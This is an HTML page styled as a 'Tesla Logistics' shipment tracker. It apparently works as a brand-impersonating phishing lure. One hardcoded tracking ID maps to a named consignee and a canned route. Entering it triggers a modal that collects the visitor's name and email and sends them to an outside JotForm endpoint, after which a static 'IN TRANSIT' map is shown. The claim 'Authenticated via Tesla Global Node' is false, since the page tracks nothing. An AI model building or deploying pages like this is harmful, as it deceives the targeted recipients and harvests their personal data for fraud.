<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Logistics | Autonomous Supply Chain</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <style>
        :root { --tesla-red: #cc0000; --tesla-dark: #171a20; }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; color: #393c41; }
        
        nav { display: flex; flex-direction: column; align-items: center; padding: 15px; background: white; border-bottom: 1px solid #eee; }
        .logo { font-weight: 700; letter-spacing: 3px; color: var(--tesla-dark); text-decoration: none; }
        
        .page { display: none; padding: 20px; box-sizing: border-box; }
        .active { display: block; }

        .hero { background: #111; color: white; padding: 50px 20px; text-align: center; border-radius: 0 0 20px 20px; }
        .search-box { background: white; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; margin-top: 20px; }
        .search-box input { border: none; padding: 15px; font-size: 1rem; outline: none; }
        .search-box button { background: var(--tesla-red); color: white; border: none; padding: 15px; font-weight: bold; }

        .receipt { border: 1px solid #ddd; padding: 20px; border-radius: 12px; background: white; }
        #map { height: 250px; width: 100%; border-radius: 8px; margin-bottom: 15px; background: #eee; }

        #email-modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; align-items:center; justify-content:center; }
        .modal-box { background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; }
    </style>
</head>
<body>

    <nav><div class="logo">TESLA LOGISTICS</div></nav>

    <div id="email-modal">
        <div class="modal-box">
            <h3>Digital Receipt</h3>
            <p style="font-size:0.9rem; color:#666;">Enter your details to receive the official manifest via email.</p>
            
            <form action="https://submit.jotform.com/submit/260152403302035/" method="POST" onsubmit="return handleFormSubmit()">
                <input type="text" name="q3_name" placeholder="Full Name" required style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px;">
                <input type="email" name="q4_email" placeholder="Email Address" required style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px;">
                <input type="hidden" name="q5_trackingId" id="hidden-id">
                
                <button type="submit" style="width:100%; background:black; color:white; padding:12px; border-radius:5px; border:none; font-weight:bold;">SEND & VIEW TRACKING</button>
            </form>
            <p onclick="closeModal()" style="margin-top:15px; color:#888; font-size:0.8rem;">Cancel</p>
        </div>
    </div>

    <div id="home" class="page active">
        <div class="hero">
            <h1 style="margin:0;">Secure Tracking</h1>
            <p style="font-size:0.9rem; color:#aaa;">Global Autonomous Network</p>
            <div class="search-box">
                <input type="text" id="track-id" placeholder="TL-78901234">
                <button onclick="checkID()">TRACK ASSET</button>
            </div>
            <p id="err" style="color:#ffcc00; margin-top:10px; font-size:0.8rem;"></p>
        </div>
    </div>

    <div id="tracking" class="page">
        <div class="receipt">
            <div id="map"></div>
            <h2 style="margin:0; color:var(--tesla-red);">IN TRANSIT</h2>
            <p id="res-name" style="margin:5px 0; font-weight:bold;"></p>
            <p style="font-size:0.8rem; color:#888;">Authenticated via Tesla Global Node</p>
            <hr style="border:0; border-top:1px solid #eee; margin:15px 0;">
            <div id="timeline" style="font-size:0.85rem; line-height:2;"></div>
            <button onclick="location.reload()" style="width:100%; margin-top:20px; padding:12px; border:none; background:#f4f4f4; border-radius:8px;">New Search</button>
        </div>
    </div>

    <script>
        const DB = {
            "TL-78901234": {
                name: "Maria Velez Wampl",
                hist: ["Jan 15: Arrived JFK Intl (NY)", "Jan 13: Departed Denver Hub", "Jan 12: Picked up Puerto Rico Hub"]
            }
        };

        function checkID() {
            const id = document.getElementById('track-id').value.trim();
            if(DB[id]) {
                document.getElementById('hidden-id').value = id;
                document.getElementById('email-modal').style.display='flex';
            } else {
                document.getElementById('err').innerText = "ID Not Found";
            }
        }

        function closeModal() { document.getElementById('email-modal').style.display='none'; }

        function handleFormSubmit() {
            const id = document.getElementById('track-id').value;
            // Delay showing the map slightly so the form has time to fire
            setTimeout(() => { renderTracking(id); }, 500);
            return true; 
        }

        function renderTracking(id) {
            closeModal();
            const data = DB[id];
            document.getElementById('res-name').innerText = "Consignee: " + data.name;
            document.getElementById('timeline').innerHTML = data.hist.map(h => "â€¢ " + h + "<br>").join('');
            
            document.getElementById('home').classList.remove('active');
            document.getElementById('tracking').classList.add('active');

            // Lightweight Mobile Map
            const m = L.map('map', {zoomControl: false}).setView([30, -70], 4);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
            L.polyline([[40,-74], [18,-66]], {color:'red', weight:2, dashArray:'5,5'}).addTo(m);
            L.circleMarker([40,-74], {radius: 5, color: 'red'}).addTo(m);
            L.circleMarker([18,-66], {radius: 5, color: 'black'}).addTo(m);
        }
    </script>
</body>
</html>
